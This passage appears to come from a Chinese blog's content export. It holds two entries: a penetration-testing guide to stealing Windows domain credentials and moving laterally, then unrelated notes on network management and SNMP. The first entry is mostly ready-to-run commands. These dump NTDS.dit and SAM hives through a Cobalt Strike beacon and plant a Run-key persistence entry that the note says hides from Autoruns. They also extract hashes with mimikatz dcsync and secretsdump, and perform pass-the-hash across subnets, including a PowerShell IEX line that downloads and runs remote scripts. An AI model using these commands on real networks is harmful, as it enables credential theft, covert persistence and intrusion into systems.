&lt;系统驱动器&gt;</span><br><span class="line"></span><br><span class="line">-nw：no writers，用来提高创建速度.允许我们在不调用卷影副本编写器的情况下创建卷影副本，实际上，这是一个非持久性卷影副本，不会留下“物理”磁盘证据</span><br><span class="line">也算一个优点</span><br></pre></td></tr></table></figure><p>执行命令：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">beacon&gt; shell vshadow.exe -nw -exec=c:\windows\system32\notepad.exe c:</span><br></pre></td></tr></table></figure><p>成功执行 Vshadow 将启动卷影服务 (VSS)，如系统事件 ID 7036 所示，并调用 VSSVC.exe 进程。<br>执行后，后台存在进程 <strong>VSSVC.exe</strong> ，同时显示服务 Volume Shadow Copy 正在运行，需要手动关闭进程 VSSVC.exe</p><p>注：手动关闭进程 VSSVC.exe 会生成日志 7034。在事件查看器-系统日志中可以看到</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208181451144.png" alt="image-20220804072844836" style="zoom: 50%;" /><h4 id="自启动持久化和规避"><a href="#自启动持久化和规避" class="headerlink" title="自启动持久化和规避"></a>自启动持久化和规避</h4><p>利用思路：<br>vshadow.exe 包含微软签名，能绕过某些白名单的限制。如果作为启动项，<strong>Autoruns的默认启动列表不显示</strong>！！！</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v VSSBackup /t REG_EXPAND_SZ /d &quot;C:\Program Files (x86)\Windows Kits\10\bin\10.0.16299.0\x64\vshadow.exe -nw -exec=c:\windows\system32\notepad.exe c:&quot;</span><br><span class="line">加入注册表，权限维持后面会讲</span><br></pre></td></tr></table></figure><p>在 AutoRuns 中，当过滤“Microsoft Entries”时，我们将看不到我们的登录条目.。但是，如果我们取消选择“Microsoft Entries”并启用“Windows Entries”，我们将看到我们的持久性机制的记录</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208181451505.png" alt="image-20220804073030521" style="zoom: 33%;" /><h3 id="NinjaCopy（不同于上面几种-推荐）"><a href="#NinjaCopy（不同于上面几种-推荐）" class="headerlink" title="NinjaCopy（不同于上面几种 推荐）"></a>NinjaCopy（不同于上面几种 推荐）</h3><p>使用PowerShell复制NTDs.dit&#x2F;Registry Hives,绕过SACL、DACL、File Locks</p><blockquote><ul><li><a href="https://adsecurity.org/?p=451">攻击者如何从域控制器中提取 Active Directory 数据库 (NTDS.dit)</a></li><li><a href="https://www.cnblogs.com/cdaniu/p/15630284.html">【windows 访问控制】三、访问控制列表 ACL&#x3D;DACL+SACL </a></li><li>在PowerSploit中有许多的powershell脚本供渗透使用~下载地址：<a href="https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-NinjaCopy.ps1">Invoke-NinjaCopy.ps1</a></li></ul></blockquote><p>用于获取哈希的技术要么依赖于将代码注入LSASS,要么使用卷影复制服务来获取包含哈希的文件的副本。<br>Invoke-NinjaCopy，一个Powershell脚本，能够通过<strong>获取卷的读取句柄</strong>并解析NTFS来复制NTDs.d1t、注册表配置单元和位于NTFS卷上的任何其他文件。</p><p><strong>操作需要提升到SYSTEM、注入到SYSTEM进程或启动新服务&#x2F;可疑程序</strong></p><p><strong>原理简述：</strong></p><blockquote><p>获取C卷的读取句柄（管理员帐户可以执行此操作），能够读取整个卷的原始字节。然后，解析C卷上的NTFS结构，确定特定文件的字节在卷上的位置，扫描到该位置并复制文件字节。</p></blockquote><blockquote><p>C++编写的NTFS解析器：<a href="http://www.codeproject.com/Articles/81456/An-NTFS-Parser-Lib">http://www.codeproject.com/Articles/81456/An-NTFS-Parser-Lib</a></p><p>将现有的NTFS解析器编译为DLL并将其加载到Invoke-ReflectivePEInjection</p></blockquote><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment">#powershell操作</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">Import-Module</span> .\<span class="built_in">invoke-NinjaCopy</span>.ps1<span class="comment">#导入模块，加载脚本</span></span><br><span class="line"><span class="built_in">Invoke-NinjaCopy</span> <span class="literal">-Path</span> C:\Windows\System32\config\SAM <span class="literal">-LocalDestination</span> .\sam.hive</span><br><span class="line"><span class="built_in">Invoke-NinjaCopy</span> <span class="literal">-Path</span> C:\Windows\System32\config\SYSTEM <span class="literal">-LocalDestination</span> .\system.hive</span><br><span class="line"><span class="built_in">Invoke-NinjaCopy</span> <span class="literal">-Path</span> <span class="string">&quot;C:\windows\ntds\ntds.dit&quot;</span> <span class="literal">-LocalDestination</span> .\ntds.dit</span><br></pre></td></tr></table></figure><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment">#CS上执行powershell操作</span></span><br><span class="line"></span><br><span class="line">beacon&gt; powershell<span class="literal">-import</span> C:\Users\MINGY\Desktop\<span class="built_in">Invoke-NinjaCopy</span>.ps1</span><br><span class="line"></span><br><span class="line">beacon&gt; powershell <span class="built_in">Invoke-NinjaCopy</span> <span class="literal">-Path</span> C:\Windows\System32\config\SAM <span class="literal">-LocalDestination</span> c:\sam.hive</span><br><span class="line"></span><br><span class="line">beacon&gt; powershell <span class="built_in">Invoke-NinjaCopy</span> <span class="literal">-Path</span> C:\Windows\System32\config\SYSTEM <span class="literal">-LocalDestination</span> c:\system.hive</span><br><span class="line"></span><br><span class="line">beacon&gt; powershell <span class="built_in">Invoke-NinjaCopy</span> <span class="literal">-Path</span> <span class="string">&quot;C:\windows\ntds\ntds.dit&quot;</span> <span class="literal">-LocalDestination</span> C:\ntds.dit</span><br></pre></td></tr></table></figure><h2 id="解密NTDS-DIT文件"><a href="#解密NTDS-DIT文件" class="headerlink" title="解密NTDS.DIT文件"></a>解密NTDS.DIT文件</h2><h3 id="Mimikatz在线破解"><a href="#Mimikatz在线破解" class="headerlink" title="Mimikatz在线破解"></a>Mimikatz在线破解</h3><p>在线破解，不用将域控上的 ntds.dit 文件下载下来，直接在已有的shell上破解。</p><p>有一个cs弹回的beacon，就可以在beacon中直接利用mimikatz来破解，这一切的前提是<strong>有管理员权限</strong></p><p>Mimikatz有一个功能（dcsync），它可以利用<strong>目录复制服务</strong>（Directory Replication Service, DRS）从NTDS.DIT文件中提取密码哈希值。<br>在获得管理员权限后，通过Cobaltstrike弹回的beacon利用mimikatz模块进行密码Hash提取。</p><ul><li>获取mingy域内所有用户Hash</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">lsadump::dcsync /domain:mingy.com /all /csv</span><br></pre></td></tr></table></figure><ul><li>查看单个用户的详细信息</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mimikatz lsadump::dcsync /domain:mingy.com /user:krbtgt</span><br></pre></td></tr></table></figure><ul><li>查看所有用户的详细信息</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mimikatz lsadump::lsa /inject</span><br></pre></td></tr></table></figure><h3 id="离线破解"><a href="#离线破解" class="headerlink" title="离线破解"></a>离线破解</h3><p>离线破解一般需要两步，首先就是将远端域控的 ntds.dit 和 SYSTEM下载到本地，然后再在本地进行破解。ntds.dit 文件一直在被 windows 系统占用，所以常规的复制下载方法是无法将文件下载到本地的。</p><ul><li>QuarksPwDump（不太好用）</li></ul><p>QuarksPwDump 是一款用于Windows用户凭据提取的开源工具，它可以抓取windows平台下多种类型的用户凭据，包括：本地帐户、域帐户、缓存的域帐户和Bitlocker。</p><p><strong>不太好用的主要原因是需要上传工具到目标主机，再去自动获取SYSKEY解密ntds.dit，而且但是容易被杀软查杀。</strong></p><ol><li>修复复制出来的数据库</li></ol><blockquote><p>esentutl是微软自带的工具，可以修复损坏或损坏的数据库。</p><p>适用于：Windows Server 2008、Windows Server 2012、Windows 8</p><p>有关如何使用此命令的示例，请参阅<a href="https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/hh875504(v=ws.11)">示例</a>。</p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">esentutl /p /o ntds.dit</span><br></pre></td></tr></table></figure><ol start="2"><li>使用QuarksPwDump直接读取信息并将结果导出至文件</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.\QuarksPwDump.exe --dump-hash-domain --output gingnir.top.txt --ntds-file .\破解\ntds.dit</span><br></pre></td></tr></table></figure><ul><li>SecretsDump</li></ul><p>通过<code>impacket</code>套件中的<code>secretsdump.py</code>脚本</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">secretsdump.exe -sam sam.hiv -security security.hiv -system sys.hiv LOCAL</span><br><span class="line">secretsdump.exe -system system.hive -ntds ntds.dit LOCAL</span><br></pre></td></tr></table></figure><blockquote><ul><li>LOCAL表示对本地文件进行解密</li><li>在对sam文件解密的时候，-security security.hiv，需要一个security.hiv的文件，同样也是在SAM文件同一个目录下</li></ul></blockquote><ul><li>NtdsAudit</li></ul><blockquote><p><a href="https://github.com/Dionach/NtdsAudit">https://github.com/Dionach/NtdsAudit</a></p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">NtdsAudit.exe &quot;ntds.dit&quot; -s &quot;system.hive&quot; -p pwdump.txt --users-csv users.csv</span><br></pre></td></tr></table></figure><h2 id="留下的痕迹（需要留意）"><a href="#留下的痕迹（需要留意）" class="headerlink" title="留下的痕迹（需要留意）"></a>留下的痕迹（需要留意）</h2><p>遗留日志文件</p><blockquote><ul><li>调用 Volume Shadow Copy 服务会产生日志文件，位于System下， <strong>Event ID 为 7036</strong></li><li>执行 ntdsutil snapshot “activate instance ntds” create quit quit 会额外产生 <strong>Event ID 为98</strong>的日志文件</li></ul><p>如下图<img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208181451555.png" alt="image-20220804074903788"></p></blockquote><h1 id="PTH（Hash传递攻击）"><a href="#PTH（Hash传递攻击）" class="headerlink" title="PTH（Hash传递攻击）"></a>PTH（Hash传递攻击）</h1><h2 id="PTH简介"><a href="#PTH简介" class="headerlink" title="PTH简介"></a>PTH简介</h2><p>PASS THE Hash  也叫 Hash  传递攻击，简称 PTH 。模拟用户登录不需要用户明文密码，就可以直接用获取到的 Hash  来登录目标系统。<br>利用成功的前提条件是：</p><ul><li>开启 445 端口 SMB  服务</li><li>开启 admin$ 共享</li></ul><h2 id="Metasploit-psexec模块"><a href="#Metasploit-psexec模块" class="headerlink" title="Metasploit psexec模块"></a>Metasploit psexec模块</h2><p>msf中有三个模块可用来hash传递攻击.msf5是以前的版本了，若是msf6不行，那便换方法，主要去用<code>exploit/windows/smb/psexec</code>尝试吧</p><h3 id="psexec-command"><a href="#psexec-command" class="headerlink" title="psexec_command"></a>psexec_command</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">执行单个命令的PTH模块</span><br><span class="line">auxiliary/admin/smb/psexec_command</span><br><span class="line">msf5 &gt; use auxiliary/admin/smb/psexec_command</span><br><span class="line">msf5 auxiliary(admin/smb/psexec_command) &gt; set rhosts 192.168.1.52</span><br><span class="line">msf5 auxiliary(admin/smb/psexec_command) &gt; set smbuser administrator</span><br><span class="line">msf5 auxiliary(admin/smb/psexec_command) &gt; set smbpass aad3b435b51404eeaad3b435b51404ee:579110c49145015c47ecd267657d3174</span><br><span class="line">msf5 auxiliary(admin/smb/psexec_command) &gt; set command &quot;whoami&quot;</span><br><span class="line">msf5 auxiliary(admin/smb/psexec_command) &gt; run</span><br></pre></td></tr></table></figure><h3 id="psexec（如果是新版msf，用这个就可）"><a href="#psexec（如果是新版msf，用这个就可）" class="headerlink" title="psexec（如果是新版msf，用这个就可）"></a>psexec（如果是新版msf，用这个就可）</h3><ul><li>工作组</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">执行直接就获取到meterpreter的PTH模块</span><br><span class="line">exploit/windows/smb/psexec</span><br><span class="line">msf5 &gt; use exploit/windows/smb/psexec</span><br><span class="line">msf5 exploit(windows/smb/psexec) &gt; set rhosts 192.168.1.52</span><br><span class="line">msf5 exploit(windows/smb/psexec) &gt; set smbuser administrator</span><br><span class="line">msf5 exploit(windows/smb/psexec) &gt; set smbpass aad3b435b51404eeaad3b435b51404ee:579110c49145015c47ecd267657d3174</span><br><span class="line">msf5 exploit(windows/smb/psexec) &gt; run</span><br></pre></td></tr></table></figure><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208091729019.png" alt="image-20220809172838938" style="zoom:50%;" /><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208091729683.png" style="zoom:50%;" /><ul><li>域</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msf5 &gt; use exploit/windows/smb/psexec</span><br><span class="line">msf5 exploit(windows/smb/psexec) &gt; set rhosts 10.10.10.201</span><br><span class="line">msf5 exploit(windows/smb/psexec) &gt; set smbdomain de1ay</span><br><span class="line">msf5 exploit(windows/smb/psexec) &gt; set smbuser administrator</span><br><span class="line">msf5 exploit(windows/smb/psexec) &gt; set smbpass f67ce55ac831223d064010d8eaa2a273:d72c9b6670e05b0fb0ba01ff546776ab</span><br><span class="line">msf5 exploit(windows/smb/psexec) &gt; run</span><br></pre></td></tr></table></figure><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208091730775.png" alt="image-20220809173005622" style="zoom:50%;" /><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208091730187.png" alt="image-20220809173019048" style="zoom:50%;" /><h3 id="psexec-psh"><a href="#psexec-psh" class="headerlink" title="psexec_psh"></a>psexec_psh</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">支持对一个网段进行PTH进行验证的模块</span><br><span class="line">exploit/windows/smb/psexec_psh</span><br><span class="line">msf5 &gt; use exploit/windows/smb/psexec_psh</span><br><span class="line">msf5 exploit(windows/smb/psexec_psh) &gt; set rhosts 192.168.1.52</span><br><span class="line">msf5 exploit(windows/smb/psexec_psh) &gt; set smbuser administrator</span><br><span class="line">msf5 exploit(windows/smb/psexec_psh) &gt; set smbpass aad3b435b51404eeaad3b435b51404ee:579110c49145015c47ecd267657d3174</span><br><span class="line">msf5 exploit(windows/smb/psexec_psh) &gt; run</span><br></pre></td></tr></table></figure><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208091731199.png" alt="image-20220809173105048" style="zoom:50%;" /><h2 id="Mimikatz-Hash传递攻击"><a href="#Mimikatz-Hash传递攻击" class="headerlink" title="Mimikatz Hash传递攻击"></a>Mimikatz Hash传递攻击</h2><p>当我们获得了内网中一台主机的NTLM哈希值，我们可以利用mimikatz对这个主机进行哈希传递攻击，执行命令成功后将会反弹回cmd</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::pth </span><br><span class="line">/user:administrator /domain:192.168.78.67 </span><br><span class="line">/ntlm:579110c49145015c47ecd267657d3174&quot; exit</span><br></pre></td></tr></table></figure><p>在弹出的cmd中，我们还可以直接连接该主机，还可以查看目录文件等操作。该CMD已经具备了权限，已经通过验证。此时我们直接net use 不需要输入密码，即可直接使用共享（因为我们已经“通过了”验证）</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net use \\192.168.1.170\c$</span><br><span class="line">dir \\192.168.1.170\c$</span><br><span class="line">copy 1.exe \\192.168.1.170\c$</span><br><span class="line">net use h: \\192.168.1.170\c$</span><br></pre></td></tr></table></figure><h2 id="CobaltStrike-Hash传递攻击"><a href="#CobaltStrike-Hash传递攻击" class="headerlink" title="CobaltStrike Hash传递攻击"></a>CobaltStrike Hash传递攻击</h2><p>和上一节CS通过用户凭证横向移动很类似。要稍等一会</p><ul><li>工作组（看图说话~~）</li></ul><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208091733205.png" alt="image-20220809173306055" style="zoom:50%;" /><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208091733163.png" alt="image-20220809173321039" style="zoom:50%;" /><ul><li>域</li></ul><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208091734054.png" alt="image-20220809173429910" style="zoom:50%;" /><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208091734353.png" alt="image-20220809173448208" style="zoom: 50%;" /><h2 id="Powershell-Hash传递攻击"><a href="#Powershell-Hash传递攻击" class="headerlink" title="Powershell Hash传递攻击"></a>Powershell Hash传递攻击</h2><p>使用已知管理员hash，批量撞指定网段机器，此方式同时适用于工作组和域环境。而且powershell这种方法，可以达到“无文件落地”、“程序内存中加载执行”的效果，而且工具Windows基本上都内置了~~<br>需要同时加载Invoke-WMIExec.ps1、Invoke-TheHash.ps1</p><blockquote><p><a href="https://github.com/Kevin-Robertson/Invoke-TheHash">https://github.com/Kevin-Robertson/Invoke-TheHash</a></p><p><a href="https://www.jianshu.com/p/fb078a99e0d8">Powershell免杀从入门到实践</a></p></blockquote><ul><li>加载脚本</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">powershell -exec bypass</span><br><span class="line">Import-Module .\Invoke-WMIExec.ps1</span><br><span class="line">Import-Module .\Invoke-TheHash.ps1</span><br><span class="line">powershell -exec bypass</span><br><span class="line">IEX (New-Object Net.WebClient).DownloadString(&#x27;http://192.168.3.86:8000/Invoke-WMIExec.ps1&#x27;);</span><br><span class="line">IEX (New-Object Net.WebClient).DownloadString(&#x27;http://192.168.3.86:8000/Invoke-TheHash.ps1&#x27;);</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Invoke-TheHash -Type WMIExec -Target 192.168.1.0/24 -Username administrator -Hash 579110c49145015c47ecd267657d3174</span><br></pre></td></tr></table></figure><ul><li>利用已有管理员hash，批量撞指定网段机器。（很实用）</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">工作组：</span><br><span class="line">PS C:\Users\Administrator&gt; Invoke-TheHash -Type WMIExec -Target 192.168.1.0/24 -Username administrator -Hash b4e535a9bb56bcc084602062c9e2a9d4</span><br><span class="line">域：</span><br><span class="line">PS C:\Users\Administrator&gt; Invoke-TheHash -Type WMIExec -Target 10.10.10.0/24 -Domain de1ay -Username administrator -Hash e1c61709dffcf154ac9d77b5024f6d10</span><br></pre></td></tr></table></figure><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208091736198.png" alt="image-20220809173638078"></p><h2 id="Impacket-Hash传递攻击"><a href="#Impacket-Hash传递攻击" class="headerlink" title="Impacket Hash传递攻击"></a>Impacket Hash传递攻击</h2><blockquote><p>Impacket 工具套件很好用</p></blockquote><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#命令执行：</span></span><br><span class="line">python2 wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:<span class="number">5791</span>10c49145015c47ecd267657d3174 administrator@<span class="number">192.168</span><span class="number">.1</span><span class="number">.52</span> <span class="string">&quot;whoami&quot;</span></span><br><span class="line"><span class="comment">#反弹shell：</span></span><br><span class="line">python2 smbexec.py -hashes aad3b435b51404eeaad3b435b51404ee:<span class="number">5791</span>10c49145015c47ecd267657d3174 administrator@<span class="number">192.168</span><span class="number">.1</span><span class="number">.52</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
          <category> 内网 </category>
          
          <category> 横向移动 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 凭证获取 </tag>
            
            <tag> 横向移动 </tag>
            
            <tag> hash传递 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网络管理&amp;SNMP</title>
      <link href="/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E5%BA%94%E7%94%A8%E5%B1%82/%E7%BD%91%E7%BB%9C%E7%AE%A1%E7%90%86&amp;SNMP.html"/>
      <url>/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E5%BA%94%E7%94%A8%E5%B1%82/%E7%BD%91%E7%BB%9C%E7%AE%A1%E7%90%86&amp;SNMP.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="网络管理"><a href="#网络管理" class="headerlink" title="网络管理"></a>网络管理</h1><h2 id="网络管理引论"><a href="#网络管理引论" class="headerlink" title="网络管理引论"></a>网络管理引论</h2><h3 id="现状、必要性、网络管理的预期目标"><a href="#现状、必要性、网络管理的预期目标" class="headerlink" title="现状、必要性、网络管理的预期目标~"></a>现状、必要性、网络管理的预期目标~</h3><ol><li>机构网络的现状:</li></ol><ul><li>设备数量多：几百台</li><li>设备种类多：链路、交换机、路由器、主机、协议等</li></ul><ol start="2"><li>出现问题很正常</li></ol><ul><li>设备本身故障</li><li>配置问题</li><li>对资源（例如链路带宽)过度使用</li></ul><ol start="3"><li>网络管理的必要性</li></ol><ul><li>·协助网管定位和解决问题</li><li>提前发现问题，预警</li></ul><ol start="4"><li>希望网络管理达到的目标</li></ol><ul><li>监测网络（各部件)的运行状态</li><li>故障时异常时报警</li><li>允许管理人员千涉系统的运行（重启、配置参数等)</li><li>自动、远程（不需要去现场）！</li></ul><ol start="5"><li>网络管理的功能举例</li></ol><ul><li><p>检测主机或路由器的网卡故障（网卡发去的帧错误增加)</p></li><li><p>自动监测主机的活跃程度</p></li><li><p>监测流量：</p><blockquote><ul><li>某网段的流量增加，可以将服务器迁到另一个网段</li><li>某网段的流量超过阈值，在用户感知之前，升级带宽</li></ul></blockquote></li><li><p>路由表格的快速变化，配置问题，在网络发生问题前发现并修复</p></li><li><p>SLA监测：掉线率，延迟，吞吐量，达到下限报警</p></li><li><p>入侵检测：攻击行为，检测和报警</p></li></ul><h3 id="功能、定义"><a href="#功能、定义" class="headerlink" title="功能、定义"></a>功能、定义</h3><ol><li>功能</li></ol><ul><li>性能管理：</li></ul><blockquote><ul><li>性能（利用率、吞吐量）量化、测量、报告、分析和控制不同网络部件的性能</li><li>涉及到的部件：单独部件（网卡，协议实体)，端到端的路径</li></ul></blockquote><ul><li>故障管理：记录、检测和响应故障；</li></ul><blockquote><ul><li>性能管理为长期监测设备性能</li><li>故障管理：突然发生的强度大的性能降低，强调对故障的响应</li></ul></blockquote><ul><li>配置管理：跟踪设备的配置，管理设备配置信息</li><li>账户管理：定义、记录和控制用户和设备访问网络资源。管理用户、资源以及哪些用户可以使用哪些资源</li></ul><blockquote><ul><li>限额使用、给予使用的收费，以及分配资源访问权限</li></ul></blockquote><ul><li>安全管理：定义安全策略，控制对网络资源的使用</li></ul><ol start="2"><li>定义</li></ol><p>网络管理包括了硬件、软件和人类元素的设置、综合和协调，以便监测、测试、轮询、配置、分析、评价和控制网络和网元资源，用合理的成本满足实时性、透行性和服务质量的要求</p><h3 id="网管实质、体系结构、现有的网管协议"><a href="#网管实质、体系结构、现有的网管协议" class="headerlink" title="网管实质、体系结构、现有的网管协议"></a>网管实质、体系结构、现有的网管协议</h3><ol><li>网络管理的实质</li></ol><p>实质：远程（分布式) 监测（查询、定期上报，以及异常异步报告)和控制</p><p>实例：集团和分支机构</p><ul><li>分支定期报告，产量等信息</li><li>分支主动报告异常</li><li>总部问分支：上报信息（指标)</li><li>总部发出指令，让分支动作</li></ul><ol start="2"><li>网络管理体系结构</li></ol><ul><li><p>管理实体：在NOC网络管理工作站上的应用程序（老板)</p><blockquote><p>执行网络管理动作：收熟处理、分析、显示</p></blockquote></li><li><p>被管设备：主机、路由器、交换机、打印机、modem（分支机构)</p></li></ul><blockquote><ul><li><strong>被管设备</strong>包括若干<strong>被管对象</strong></li></ul><blockquote><p>硬件的一个部分（网卡）<br>某些硬件或软件的配置参数集合(RIP路由协议)</p></blockquote><ul><li>被管对象的信息收集在：本地<strong>管理信息库MIB</strong>中</li><li>被管设备中驻留网络管理代理agent,与管理实体通信，在被管设备上执行本地动作</li></ul></blockquote><ul><li>网络管理协议</li></ul><blockquote><ul><li>在管理实体和被管设备之间</li><li>允许实体查询设备的信息，报告异常事件</li><li>通过代理对设备间接地采取动作</li></ul></blockquote><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208190043415.png" alt="image-20220819004302290" style="zoom: 67%;" /><ol start="3"><li>目前已有的网络管理协议</li></ol><ul><li>OSI:CMISE&#x2F;CMIP</li><li>互联网：SNMP（SNMP仅仅是互联网网络管理体系中的一个组成部分）</li></ul><h2 id="互联网网络管理架构"><a href="#互联网网络管理架构" class="headerlink" title="互联网网络管理架构"></a>互联网网络管理架构</h2><ol><li>网管需要解决的问题</li></ol><ul><li>需要监视和控制被管设备的什么信息?</li></ul><blockquote><ul><li>被管设备需要管理和维护的信鼻：<strong>被管对象</strong></li></ul><blockquote><ul><li>例如：到目前为止接收到的错误分组个数，系统的描述信息等</li><li>需要命名标识和约定</li></ul></blockquote><ul><li>相关被管对象汇聚成：模块，被管设备中的被管模块形成本地存储MIB(Management Information Base)</li></ul></blockquote><ul><li>被控信息什么形式进行定义和传输?</li></ul><blockquote><ul><li>数据定义语言：SMl(Structure of Managerment Intormation)</li></ul><blockquote><ul><li>用整数，还是字符串还是什么表示这个被管对象</li><li>MIB库中的所有对象和模块采用SMl(ASN.1)定义，像C语言那样</li></ul></blockquote><ul><li>BER:定义的被管对象和模块采用BER转换成标准码流进行数据交换</li></ul></blockquote><ul><li>什么格式和时机进行管理信息的交换：SNMP协议</li></ul><p>SNMP协议和MIB、SMI相互独立便于独立演化</p><h3 id="SMI-管理信息结构"><a href="#SMI-管理信息结构" class="headerlink" title="SMI:管理信息结构"></a>SMI:管理信息结构</h3><p>被管对象的三个属性：</p><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208190106073.png" alt="image-20220819010648920"></p><h4 id="命名（标识）：0ID"><a href="#命名（标识）：0ID" class="headerlink" title="命名（标识）：0ID"></a>命名（标识）：0ID</h4><ol><li>一个唯一的标示</li></ol><ul><li>MB库由一堆对象构成，每个对象需要一个唯一标示</li><li>需要一个标示方法，SMI的内容之一</li><li>如：用什么ID标识某个P上网卡收到的数据包个数</li></ul><ol start="2"><li>对象的命名：0ID和01D树</li></ol><ul><li>平面命名：重名（命名或者编号），不便于管理，也不携带对象之间的关系</li></ul><blockquote><p>所以我们转用<strong>层次命名</strong>：像域名空间(好用)</p></blockquote><ul><li><p>一个对象的标示符（对象ID)唯一确定了在MIB层次结构中的一个被管对象</p></li><li><p>层次：一棵树，根不命名，一层层分配命名（有对应标号）</p></li><li><p>0ID:一个对象可以用从树根到树叶的节点名字（或者数字）来标示</p><blockquote><p>iso.org.dod.internet.mgmt.mib&lt;&#x3D;&gt;1.3.6.1.2.1</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208190121692.png" alt="image-20220819012103547" style="zoom: 80%;" /><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208190124234.png" alt="image-20220819012229424"></p></blockquote></li><li><p>MIB库就是一个按照层次组织起来的0ID（对象ID）集合</p></li></ul><blockquote><ul><li>对象构成组</li><li>(组+对象)构成模块</li><li>一些标准模块形成：MIB库</li></ul></blockquote><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208190124783.png" alt="image-20220819012453607" style="zoom:67%;" /><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208190127973.png" alt="image-20220819012753816" style="zoom:50%;" /><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208190128298.png" alt="image-20220819012832116" style="zoom:50%;" /><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208190129531.png" alt="image-20220819012927333" style="zoom:50%;" /><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208190130540.png" alt="image-20220819013015368" style="zoom:67%;" /><h4 id="语法（定义）：ASN-1"><a href="#语法（定义）：ASN-1" class="headerlink" title="语法（定义）：ASN.1"></a>语法（定义）：ASN.1</h4><ul><li>用来定义对象的数据类型（整数，字符串…)，类似c语言可以自定义数据结构</li><li>如：数据包个数用什么类型的数据结构表示</li><li>MIB库中的所有对象和模块采用SMl(ASN.1)定义，像C语言那样</li></ul><ol><li>对象的第2个属性：数据类型</li></ol><blockquote><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208191018502.png" alt="image-20220819101844407"></p></blockquote><ol start="2"><li>SMI采用ASN.1的一些基本内容，另外增加了一些定义</li></ol><blockquote><ul><li>Abstract Syntax Notation One(ASN.1)是一个<strong>数据定义语言</strong>，用于定义MIB中被管对象，可以使其在获得机器无关的表示一致性</li><li>ASN.1采用变量和声明，类似于编程语言。而后面讲到的传输编码EBR像机器语言</li><li>提供供应商中立、跨平台、标准的语言，用于开发者来描述协议，系统和机器</li><li>像ASN.1的一致性语言允许不同类型的计算机能够更有效的分享信息</li></ul></blockquote><ol start="3"><li>ASN.1介绍</li></ol><blockquote><ul><li><p>ASN.1是SNMP用于创建实际MIB对象的数据表示格式</p></li><li><p>ASN.1在SNMP之前很早就存在</p></li><li><p>MIB的定义充分利用了ASN.1的优势</p></li><li><p>ASN.1是0SI的标准：IS08824</p></li><li><p>SNMP采用了ASN.1定义了<strong>交换报文的格式</strong>以及<strong>管理的对象</strong></p><p><strong>这意味着这种数据定义语言，不仅可以定义对象，也可以定义报文交换格式</strong></p></li></ul></blockquote><p>注：SNMP<strong>报文和被管对象（模块）都采用ASN.I定义</strong>；BER进行编码</p><ol 